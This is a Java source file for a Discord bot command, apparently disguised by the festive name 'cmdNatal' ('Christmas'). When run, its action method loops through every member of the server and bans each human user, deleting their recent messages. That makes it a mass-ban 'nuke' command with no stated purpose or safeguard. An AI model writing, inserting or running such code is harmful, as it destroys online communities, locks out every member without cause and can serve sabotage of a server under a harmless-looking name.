package com.mssjim.comandos;

import java.util.List;

import com.mssjim.core.Command;

import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

public class cmdNatal implements Command {

    @Override
    public boolean called(String[] args, MessageReceivedEvent event) {
        return false;
    }

    @Override
    public void action(String[] args, MessageReceivedEvent event) {

		List<Member> m = event.getGuild().getMembers();

		for(int i = 0; i < m.size(); i++) {
			System.out.println(i + " - " + m.get(i).getUser().getAsTag());
			if(!m.get(i).getUser().isBot()) {
				try {
					event.getGuild().ban(m.get(i), 1).complete();
				} catch (Exception e) {
					System.out.println(e.toString());
				}
			}
		}
    }

    @Override
    public void executed(boolean sucess, MessageReceivedEvent event) {

    }

    @Override
    public String help() {
        return null;
    }
}
